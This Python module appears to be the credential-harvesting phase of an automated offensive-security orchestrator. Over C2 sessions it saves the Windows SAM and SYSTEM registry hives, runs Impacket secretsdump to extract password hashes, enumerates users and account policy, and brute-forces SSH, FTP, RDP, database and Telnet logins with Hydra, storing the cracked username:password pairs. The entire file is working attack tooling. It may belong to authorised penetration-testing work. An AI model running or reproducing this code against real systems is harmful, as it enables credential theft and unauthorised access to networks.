import time
import logging

from orchestrator.brain.phases.models import Finding, PhaseResult, Severity
from orchestrator.c2.manager import get_c2
from orchestrator.ad.toolkit import get_ad_toolkit
from orchestrator.pivot.manager import get_pivot

logger = logging.getLogger("phase_credential")


async def run_credential(target: str, findings: list[Finding] = None) -> PhaseResult:
    t0 = time.time()
    cred_findings = []
    errors = []

    c2 = get_c2()
    ad = get_ad_toolkit()
    pivot = get_pivot()

    sessions = await c2.refresh_sessions()
    proxy_env = pivot.env_for_target(target)

    if not c2.backend_available:
        errors.append("C2 backend unavailable (no Sliver/agent capability)")
    elif not sessions:
        errors.append("No active C2 sessions — credential harvesting requires sessions from post-ex")

    for s in sessions:
        for cmd in [
            "reg save HKLM\\SAM /tmp/sam.save",
            "reg save HKLM\\SYSTEM /tmp/system.save",
        ]:
            result = await c2.execute(s.id, cmd)
            if result.output:
                cred_findings.append(Finding(
                    phase="credential", type="registry_saved", target=target,
                    host=s.address, severity=Severity.HIGH,
                    description=f"Saved: {cmd.split()[-1]}",
                    evidence=result.output[:300],
                ))

        if ad.has_impacket:
            dump = ad.secretsdump(s.address, proxy_env=proxy_env)
            if dump.get("hashes_extracted", 0) > 0:
                cred_findings.append(Finding(
                    phase="credential", type="hashdump", target=target,
                    host=s.address, severity=Severity.CRITICAL,
                    description=f"secretsdump: {dump['hashes_extracted']} hashes",
                    evidence="\n".join(dump.get("hashes", [])[:5]),
                    raw=dump,
                ))
        else:
            errors.append("Impacket not available for secretsdump")

    for s in sessions:
        for cmd in [
            'powershell -Command "Get-WmiObject -Class Win32_ComputerSystem | Select-Object Username"',
            "net accounts",
        ]:
            result = await c2.execute(s.id, cmd)
            if result.output and "error" not in result.output.lower():
                cred_findings.append(Finding(
                    phase="credential", type="session_enum", target=target,
                    host=s.address, severity=Severity.INFO,
                    description=f"$ {cmd.split()[-1]}",
                    evidence=result.output[:300],
                ))

    from orchestrator.scanners.hydra_wrapper import HydraWrapper
    hydra = HydraWrapper()
    open_ports = {(f.host or target, f.port, f.service) for f in (findings or []) if f.type == "open_port"}
    for host, port, svc in open_ports:
        if svc in ("ssh", "ftp", "rdp", "telnet", "mysql", "postgresql") or port in (22, 21, 3389, 23, 3306, 5432):
            svc_map = {22: "ssh", 21: "ftp", 3389: "rdp", 23: "telnet", 3306: "mysql", 5432: "postgres"}
            svc_name = svc if svc in svc_map.values() else svc_map.get(port, "ssh")
            try:
                hydra_result = await hydra.brute(host, svc_name, port=port, timeout=120)
                for cred in hydra_result.get("credentials", []):
                    cred_findings.append(Finding(
                        phase="credential", type="bruteforce", target=target,
                        host=host, port=port, severity=Severity.CRITICAL,
                        description=f"Hydra: {svc_name} login on {host}:{port}",
                        evidence=f"{cred['user']}:{cred['password']}",
                        payload=f"{cred['user']}:{cred['password']}",
                    ))
            except Exception as e:
                logger.debug(f"Hydra brute on {host}:{port} failed: {e}")
                errors.append(f"hydra:{host}:{port}:{e}")

    latency = time.time() - t0
    return PhaseResult(
        phase="credential",
        success=len(cred_findings) > 0,
        findings=cred_findings,
        summary=f"Credential gathering: {len(cred_findings)} findings",
        raw_output=f"sessions: {len(sessions)} | impacket: {ad.has_impacket}",
        latency=latency,
        error="; ".join(errors) if errors else None,
    )
